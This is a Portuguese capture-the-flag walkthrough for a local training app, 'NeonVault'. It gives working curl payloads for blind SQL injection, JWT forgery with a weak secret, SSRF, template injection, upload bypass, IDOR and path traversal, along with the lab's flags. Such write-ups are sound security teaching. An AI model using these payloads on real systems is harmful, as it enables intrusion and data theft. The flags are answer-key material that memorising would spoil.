# Walkthrough — Lab 2 NeonVault

Aviso:
Este arquivo contém spoilers completos, payloads e flags. Use somente depois de tentar resolver o lab.

Este guia foi escrito em modo real: a ideia é mostrar como uma pessoa investigaria o NeonVault pelo navegador, observando pistas da interface, usando DevTools ou Burp Suite quando fizer sentido, e recorrendo ao terminal ou `curl` como apoio.

## Preparação

Suba o laboratório:

```bash
cd ~/ctf-labs/lab-02-neonvault
docker compose up --build
```

Acesse no navegador:

```text
http://127.0.0.1:8092
```

Credencial inicial:

```text
nova / nova2099
```

Ferramentas úteis:

- Navegador: para seguir o fluxo como jogador.
- DevTools: para ver cookies, requisições, respostas e status HTTP.
- Burp Suite: opcional, para interceptar e editar parâmetros com mais conforto.
- Terminal: para comandos auxiliares.
- `curl`: bom para repetir testes com precisão.
- `jq`: opcional, para formatar respostas JSON.

## Como jogar em modo real

Comece pela home, faça login com `nova / nova2099` e use o dashboard como hub. Os textos da interface não entregam payloads prontos, mas indicam módulos suspeitos: recuperação legada, tokens de sessão, integrações internas, templates, uploads, logs, tickets e downloader legado.

Uma boa dinâmica é:

1. Abra a página no navegador.
2. Leia os cards e pistas do módulo.
3. Faça um teste simples pela interface.
4. Observe a requisição no DevTools ou Burp.
5. Ajuste parâmetros manualmente.
6. Use `curl` quando precisar medir tempo, repetir payloads ou enviar headers.

## 1. Time-Based Blind SQL Injection

### O que vamos explorar

Vamos explorar uma SQL Injection cega baseada em tempo. A aplicação não mostra diretamente o código de recuperação do admin, então usamos atrasos na resposta para inferir o valor caractere por caractere.

### Onde fica

Rotas:

```text
GET /api/check-user?username=
POST /recover
```

Páginas da interface:

```text
/login
/recover
```

### Como identificar

Depois de tentar payloads básicos no login, o próprio gateway rejeita a entrada e aponta para recuperação de acesso. Isso ensina uma ideia importante: nem sempre a SQL Injection está no login principal.

Na tela `/recover`, a copy fala em fluxo legado de recuperação. O endpoint `/api/check-user` também permite checar se um usuário existe, o que sugere uma superfície auxiliar de consulta.

Como a resposta não revela senha nem código, testamos uma condição que só muda o tempo de resposta.

### Teste inicial

No navegador, acesse:

```text
http://127.0.0.1:8092/recover
```

Abra DevTools > Network e interaja com a recuperação. Em seguida, teste manualmente no navegador:

```text
http://127.0.0.1:8092/api/check-user?username=admin
```

Você deve ver uma resposta JSON indicando que o usuário existe.

Também é útil comparar com:

```text
http://127.0.0.1:8092/api/check-user?username=ghost
```

Via `curl`:

```bash
curl -sG http://127.0.0.1:8092/api/check-user --data-urlencode "username=admin"
curl -sG http://127.0.0.1:8092/api/check-user --data-urlencode "username=ghost"
```

### Exploração passo a passo

Agora testamos se uma condição verdadeira causa atraso:

```bash
time curl -sG http://127.0.0.1:8092/api/check-user \
  --data-urlencode "username=admin' AND IF(SUBSTR(recovery_code,1,1)='N',SLEEP(2),0)-- "
```

Esse payload pergunta: "o primeiro caractere do `recovery_code` é `N`?" Se for, o servidor espera 2 segundos.

Compare com uma condição falsa:

```bash
time curl -sG http://127.0.0.1:8092/api/check-user \
  --data-urlencode "username=admin' AND IF(SUBSTR(recovery_code,1,1)='X',SLEEP(2),0)-- "
```

No Burp, o mesmo teste pode ser feito interceptando a requisição para `/api/check-user` e alterando o parâmetro `username`.

Depois de confirmar a técnica, extraia o código posição por posição:

```text
SUBSTR(recovery_code,1,1)='N'
SUBSTR(recovery_code,2,1)='3'
SUBSTR(recovery_code,3,1)='O'
SUBSTR(recovery_code,4,1)='N'
```

O código recuperado é:

```text
N3ON
```

Volte ao navegador em `/recover` e envie:

```text
username: admin
recovery_code: N3ON
```

Ou use `curl`:

```bash
curl -i -X POST http://127.0.0.1:8092/recover \
  -d "username=admin" \
  -d "recoveryCode=N3ON"
```

### Resultado esperado

A tela de recuperação aceita o código do admin e exibe a evidência.

### Flag

```text
FLAG{blind_sqli_extracted_admin}
```

### O que você aprendeu

Blind SQLi baseada em tempo permite extrair dados mesmo quando a resposta não mostra o resultado da consulta. A diferença está no tempo de resposta.

## 2. JWT Weak Secret / Token Forgery

### O que vamos explorar

Vamos explorar um JWT assinado com segredo fraco. O token do usuário comum tem `role=user`; ao forjar um token com `role=admin`, conseguimos acessar o núcleo administrativo.

### Onde fica

Rotas:

```text
/login
/admin/core
```

### Como identificar

Depois do login, a sessão é mantida por um cookie. A tela `/admin/core` bloqueia o usuário comum, mas a mensagem indica que o core avalia claims de sessão. Isso sugere JWT.

JWTs têm três partes:

```text
header.payload.signature
```

O payload pode ser decodificado sem a chave, mas para alterar o conteúdo precisamos assinar novamente.

### Teste inicial

No navegador:

1. Faça login com `nova / nova2099`.
2. Acesse `/admin/core`.
3. Observe o bloqueio `403`.
4. Abra DevTools > Application > Cookies.
5. Localize o cookie `neon_token`.
6. Copie o valor do token.

Você pode colar o token em uma ferramenta local ou no jwt.io para entender o formato. Em um ambiente de estudo local, isso ajuda a visualizar que existe `role=user`.

### Exploração passo a passo

Gere um novo token com `role=admin` usando o Node dentro do container:

```bash
cd ~/ctf-labs/lab-02-neonvault
TOKEN=$(docker compose exec -T neonvault node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({sub:2,username:'nova',displayName:'Nova Tanaka',role:'admin'}, 'neon'))")
echo "$TOKEN"
```

Esse comando usa o segredo fraco:

```text
neon
```

Para testar pelo Burp, intercepte a requisição para `/admin/core` e adicione:

```text
Authorization: Bearer SEU_TOKEN_AQUI
```

Pelo terminal:

```bash
curl -i -H "Authorization: Bearer $TOKEN" http://127.0.0.1:8092/admin/core
```

### Resultado esperado

O core administrativo aceita o token forjado e exibe a evidência.

### Flag

```text
FLAG{jwt_forged_neon_admin}
```

### O que você aprendeu

JWT não é seguro apenas por parecer criptográfico. Se o segredo for fraco, um atacante pode forjar claims e elevar privilégios.

## 3. SSRF em Webhook Tester

### O que vamos explorar

Vamos explorar Server-Side Request Forgery. O Webhook Tester recebe uma URL e o servidor faz a requisição por trás. Isso permite acessar serviços que o navegador do jogador não acessaria diretamente.

### Onde fica

Rota:

```text
/tools/webhook
```

### Como identificar

No dashboard e na tela de webhook, a interface fala sobre integrações internas e adaptadores que respondem dentro do vault. Isso sugere que o servidor pode alcançar recursos internos.

Um detalhe importante: `127.0.0.1` no navegador aponta para a sua máquina, mas `127.0.0.1` usado pelo backend aponta para o ambiente do servidor/container.

### Teste inicial

No navegador:

1. Faça login.
2. Acesse `/tools/webhook`.
3. Envie uma URL simples no formulário.
4. Observe que a resposta é renderizada na própria página.

Se estiver usando Burp, intercepte o POST e altere o campo `url`.

### Exploração passo a passo

Teste o status interno:

```text
http://127.0.0.1:5000/internal/status
```

Pelo navegador, coloque essa URL no campo do Webhook Tester e envie.

Via `curl` com cookie autenticado:

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"

curl -i -b cookies.txt -X POST http://127.0.0.1:8092/tools/webhook \
  -d "url=http://127.0.0.1:5000/internal/status"
```

Depois teste o recurso sensível:

```text
http://127.0.0.1:5000/internal/flag
```

Via `curl`:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/tools/webhook \
  -d "url=http://127.0.0.1:5000/internal/flag"
```

### Resultado esperado

A resposta do serviço interno aparece dentro do painel de webhook.

### Flag

```text
FLAG{ssrf_internal_neon_service}
```

### O que você aprendeu

SSRF acontece quando o servidor busca uma URL controlada pelo usuário. O impacto cresce quando o servidor consegue acessar serviços internos não expostos publicamente.

## 4. SSTI em Messages Preview

### O que vamos explorar

Vamos explorar Server-Side Template Injection. A tela de preview interpreta o conteúdo digitado como template, então expressões podem ser avaliadas pelo servidor.

### Onde fica

Rota:

```text
/messages/preview
```

### Como identificar

A interface fala que templates de operador são renderizados antes da publicação. Quando uma aplicação renderiza texto controlado pelo usuário, vale testar se ela apenas imprime o texto ou se interpreta expressões.

### Teste inicial

No navegador:

1. Acesse `/messages/preview`.
2. Digite uma mensagem normal, como `Operador online`.
3. Envie e veja o preview.
4. Agora digite:

```text
{{7*7}}
```

Se o preview mostrar `49`, a aplicação avaliou a expressão.

Via `curl`:

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"

curl -i -b cookies.txt -X POST http://127.0.0.1:8092/messages/preview \
  -d "template={{7*7}}"
```

### Exploração passo a passo

Depois de provar execução de expressão, procure objetos disponíveis no contexto do template. Neste lab, existe um objeto `vault`.

Envie:

```text
{{vault.sstiSecret}}
```

Pelo navegador, cole o payload na textarea e envie.

Via `curl`:

```bash
curl -i -b cookies.txt -X POST http://127.0.0.1:8092/messages/preview \
  -d "template={{vault.sstiSecret}}"
```

### Resultado esperado

O preview renderiza o valor sensível do contexto do template.

### Flag

```text
FLAG{ssti_template_breach}
```

### O que você aprendeu

SSTI ocorre quando entrada do usuário é processada como template. Mesmo uma expressão simples como `{{7*7}}` pode provar que o servidor está avaliando conteúdo controlado pelo usuário.

## 5. File Upload Bypass

### O que vamos explorar

Vamos explorar um bypass de upload. A aplicação tenta validar arquivos de avatar/badge, mas confia demais no nome e na extensão.

### Onde fica

Rota:

```text
/avatar
```

### Como identificar

A tela de avatar fala em validador legado e pipeline de badges. Isso sugere que vale testar quais extensões são aceitas e se o filtro olha apenas para o nome do arquivo.

### Teste inicial

No navegador:

1. Acesse `/avatar`.
2. Tente enviar um arquivo `.txt` simples.
3. Observe a rejeição.
4. Envie uma imagem `.png` comum.
5. Observe o aceite e o link do upload.

No Burp, você pode interceptar o upload e trocar apenas o `filename` do multipart para testar como o filtro reage.

### Exploração passo a passo

Crie um arquivo HTML com o marcador usado pelo lab:

```bash
printf '<h1>NEON_UPLOAD_PROBE</h1>' > /tmp/badge.html
```

Pelo navegador:

1. Volte para `/avatar`.
2. Selecione `/tmp/badge.html`.
3. Envie o arquivo.
4. Observe a mensagem de aceite e a evidência.

Via `curl`:

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"

curl -i -b cookies.txt -X POST http://127.0.0.1:8092/avatar \
  -F "avatar=@/tmp/badge.html;filename=badge.html"
```

Outros nomes que demonstram a fraqueza do filtro:

```text
avatar.php.png
template.phtml
```

### Resultado esperado

O upload com nome aceito pelo filtro legado revela a evidência do lab.

### Flag

```text
FLAG{upload_filter_bypass}
```

### O que você aprendeu

Validar upload apenas por nome ou extensão é frágil. Sistemas reais precisam validar conteúdo, tipo, armazenamento, execução e autorização de acesso.

## 6. SQL Injection em filtro de logs

### O que vamos explorar

Vamos explorar SQL Injection em um filtro de logs. A falha não está no login; está em um parâmetro de consulta usado por um módulo legado.

### Onde fica

Rota:

```text
/logs?level=
```

Página:

```text
/logs
```

### Como identificar

A tela de logs mostra filtros por nível e um traço de filtro legado. Em sistemas antigos, filtros de busca muitas vezes viram SQL montado de forma insegura.

O raciocínio é: se `level=error` mostra apenas erros, talvez possamos alterar a lógica do filtro para retornar mais registros.

### Teste inicial

No navegador:

1. Acesse `/logs`.
2. Use o filtro `error`.
3. Observe que aparecem logs comuns, sem a flag oculta.

URL normal:

```text
http://127.0.0.1:8092/logs?level=error
```

### Exploração passo a passo

Altere o parâmetro `level` na barra do navegador ou no Burp:

```text
/logs?level=error' OR '1'='1'--
```

Se o navegador cortar ou codificar caracteres, use Burp Repeater ou `curl` com `--data-urlencode`:

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"

curl -i -b cookies.txt -G http://127.0.0.1:8092/logs \
  --data-urlencode "level=error' OR '1'='1'-- "
```

O payload altera a condição do filtro para retornar também registros que ficariam ocultos.

### Resultado esperado

A página de logs passa a exibir um log oculto com a evidência.

### Flag

```text
FLAG{logs_filter_sqli}
```

### O que você aprendeu

SQL Injection pode aparecer em filtros, buscas e relatórios. Não é uma falha exclusiva de telas de login.

## 7. IDOR em API de tickets

### O que vamos explorar

Vamos explorar Insecure Direct Object Reference. A API retorna tickets por ID, mas não valida corretamente se o ticket pertence ao usuário autenticado.

### Onde fica

Rotas:

```text
/profile
/api/tickets/:id
```

### Como identificar

No perfil, há pistas sobre objetos internos e tickets. APIs que recebem IDs previsíveis são bons alvos para testar IDOR.

O problema não é saber que um ID existe; o problema é o servidor entregar o objeto sem checar o `ownerId`.

### Teste inicial

No navegador:

1. Faça login.
2. Acesse `/profile`.
3. Observe as pistas sobre tickets e objetos.
4. Abra:

```text
http://127.0.0.1:8092/api/tickets/101
```

Você deve receber um JSON de ticket do usuário comum.

Com `jq` opcional:

```bash
curl -s -b cookies.txt http://127.0.0.1:8092/api/tickets/101 | jq
```

### Exploração passo a passo

Troque manualmente o ID para um objeto administrativo:

```text
http://127.0.0.1:8092/api/tickets/777
```

Via `curl`:

```bash
curl -i -c cookies.txt -X POST http://127.0.0.1:8092/login \
  -d "username=nova" \
  -d "password=nova2099"

curl -i -b cookies.txt http://127.0.0.1:8092/api/tickets/777
```

### Resultado esperado

A API retorna um ticket administrativo que o usuário `nova` não deveria acessar.

### Flag

```text
FLAG{api_idor_object_leak}
```

### O que você aprendeu

IDOR acontece quando a aplicação confia no ID fornecido pelo usuário e esquece de validar autorização no objeto solicitado.

## 8. Path Traversal

### O que vamos explorar

Vamos explorar leitura de arquivos fora do diretório permitido. O downloader recebe um nome de arquivo e não valida corretamente o caminho final.

### Onde fica

Rotas:

```text
/files
/download?file=
```

### Como identificar

A tela `/files` apresenta um Legacy Archive e fala sobre rastros de migração. O fluxo esperado é seguir a trilha:

```text
Files -> Download -> logs -> backup
```

Primeiro provamos a funcionalidade normal, depois tentamos sair do diretório de downloads.

### Teste inicial

No navegador:

1. Acesse `/files`.
2. Clique ou abra um arquivo normal.
3. Teste:

```text
http://127.0.0.1:8092/download?file=report.pdf
```

Isso prova que o downloader funciona.

### Exploração passo a passo

Agora tente ler um log fora da pasta pública:

```text
http://127.0.0.1:8092/download?file=../../var/log/neonvault/access.log
```

Via `curl`:

```bash
curl -i "http://127.0.0.1:8092/download?file=../../var/log/neonvault/access.log"
```

Leia o conteúdo do log. Ele aponta para um backup legado:

```text
../../backup/legacy-admin-notes.bak
```

Abra esse caminho pelo downloader:

```text
http://127.0.0.1:8092/download?file=../../backup/legacy-admin-notes.bak
```

Via `curl`:

```bash
curl -i "http://127.0.0.1:8092/download?file=../../backup/legacy-admin-notes.bak"
```

### Resultado esperado

O backup legado é lido pelo endpoint de download e revela a evidência.

### Flag

```text
FLAG{traversal_follow_the_logs}
```

### O que você aprendeu

Path Traversal acontece quando a aplicação concatena caminhos de arquivo sem normalizar e restringir o destino final. Logs e backups são alvos comuns durante investigação.

## Checklist final

- [ ] FLAG{blind_sqli_extracted_admin}
- [ ] FLAG{jwt_forged_neon_admin}
- [ ] FLAG{ssrf_internal_neon_service}
- [ ] FLAG{ssti_template_breach}
- [ ] FLAG{upload_filter_bypass}
- [ ] FLAG{logs_filter_sqli}
- [ ] FLAG{api_idor_object_leak}
- [ ] FLAG{traversal_follow_the_logs}

## O que este lab ensina

- Blind SQLi: como inferir dados por diferença de tempo quando a resposta não mostra o resultado.
- JWT: como claims podem ser forjadas quando o segredo de assinatura é fraco.
- SSRF: como uma aplicação pode ser induzida a acessar recursos internos.
- SSTI: como entrada do usuário pode ser interpretada pelo servidor como template.
- Upload Bypass: como validações fracas de nome/extensão podem ser contornadas.
- SQLi: como filtros e buscas também podem ser superfícies de injeção.
- IDOR: como objetos previsíveis vazam dados sem controle de autorização por dono.
- Path Traversal: como parâmetros de arquivo podem escapar do diretório esperado.

## Troubleshooting

Docker não está rodando:

```bash
docker compose ps
```

Se o daemon não responder, inicie o Docker Desktop ou o serviço Docker do seu ambiente.

Porta `8092` em uso:

```bash
docker compose down
docker compose ps
```

Se outro processo estiver usando a porta, pare o processo antigo ou ajuste o ambiente antes de subir o lab.

Usuário sem permissão para Docker:

- No Linux, verifique se seu usuário pertence ao grupo `docker`.
- Como alternativa local, use o padrão recomendado pelo seu ambiente, como `sudo docker`.

Container antigo:

```bash
docker compose down
docker compose up --build
```

Rota autenticada retorna login ou bloqueio:

- Faça login novamente com `nova / nova2099`.
- Apague cookies antigos do navegador para `127.0.0.1`.
- Em `curl`, recrie `cookies.txt` com o POST de login.

Burp não intercepta:

- Confirme que o navegador está usando o proxy do Burp.
- Confirme que a interceptação está ligada.
- Para HTTPS seria necessário certificado, mas este lab usa HTTP local.

Payload parece não funcionar no navegador:

- Tente codificar pela barra de endereço.
- Use Burp Repeater para controlar o parâmetro.
- Use `curl --data-urlencode` quando o payload tiver espaços, aspas ou caracteres especiais.
